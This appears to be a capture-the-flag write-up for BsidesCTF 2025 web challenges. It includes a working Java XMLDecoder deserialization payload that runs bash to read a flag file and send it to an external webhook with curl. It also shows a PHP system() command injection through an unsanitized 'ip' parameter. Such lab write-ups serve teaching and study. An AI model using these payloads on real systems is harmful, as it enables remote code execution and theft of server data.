--------------------

### CTF-: BsidesCTF 2025

--------------------

![image](https://github.com/user-attachments/assets/5758bd60-e622-47de-9566-4e408ae2f6f7)

---------------------

### Challenges

----------------------

- Web-:
  - Dating
  - Detector
  - Detector-2

-----------------------

### Dating

-----------------------

![image](https://github.com/user-attachments/assets/a7046cc7-6849-408c-8aab-17124266f0a6)


-----------------------

- The challenge contains this java file `ProfileServlet.java`.

```java
package com.example.dragon;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.beans.XMLDecoder;
import java.io.IOException;

@WebServlet("/ProfileServlet")
public class ProfileServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/plain");

        try {
            XMLDecoder decoder = new XMLDecoder(request.getInputStream());
            Object dragonData = decoder.readObject();
            decoder.close();

            response.getWriter().write("Profile received for: " + dragonData.toString());
        } catch (Exception e) {
            response.getWriter().write("Error processing profile: " + e.getMessage());
        }
    }
}
```

- My eyes caught this  line `XMLDecoder decoder = new XMLDecoder(request.getInputStream());`.This class `XML Decoder` in java is vulnerable to `Insecure Deserialization` which can lead to RCE.A specially crafted XML payload can be used to invoke arbitrary java classes and methods to trigger RCE on the server.
- My Xml Payload-:

```xml
<java version="1.8.0" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
	<string>/bin/bash</string>
      </void>
      <void index="1">
	<string>-c</string>
      </void>
      <void index="2">
	      <string>cat /flag.txt | /usr/bin/curl https://www.postb.in/1745777549695-6946147335693 -d @-</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```

- The payload invokes class `java.lang.ProcessBuilder` which runs the `bash` binary with `-c` option to run a statement.Since I can't get an output, I interacted with a web hook with curl which serves the result of the executed command `cat /flag.txt` as `POST` data.

![image](https://github.com/user-attachments/assets/3cff1ab8-2554-4846-a2f9-c49bb10658f0)

- Web hook's result-:

![image](https://github.com/user-attachments/assets/5aa72db4-31a6-4dfb-93df-3a6c0470c2e5)

- Flag-:```CTF{helping-dragons-find-love-since-2025}```

---------------------------

### Detector

---------------------------

![image](https://github.com/user-attachments/assets/7ca325f0-6f4d-4ce1-aee3-8b6d826e2b80)

--------------------------

- It contains 2 source files `index.php` and `detect-dragon.php`.The vulnerable point is the `detect-dragon.php`.

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dragon Detector</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
<?php
  $ip = $_REQUEST['ip'];

  echo "<h1>";
  system("bash /app/dragon-detector-ai $ip");
  echo "</h1>";

  echo '<br><a href="/">Check another IP</a>';
?>
    </div>
</body>
</html>
```

- The vulnerable parameter is `$_REQUEST['ip']` because it gets passed unfiltered to a shell statement in `system()` and it is not news that `system()` is vulnerable to command injection.I closed the statement with `;` to execute a new command.

```php
<?php
  $ip = $_REQUEST['ip'];

  echo "<h1>";
  system("bash /app/dragon-detector-ai $ip");
  echo "</h1>";

  echo '<br><a href="/">Check another IP</a>';
?>
```

- Exploiting it by executing command `id`-:

![image](https://github.com/user-attachments/assets/1fbcab48-a4dd-4191-bd81-42470f7b2451)

- Flag-:```CTF{tharr-be-draggggons}```

![image](https://github.com/user-attachments/assets/8e721bc5-4867-4bdb-8723-6ca822365c4f)


--------------------

### Detector-2

--------------------

![Uploading image.png…]()


--------------------
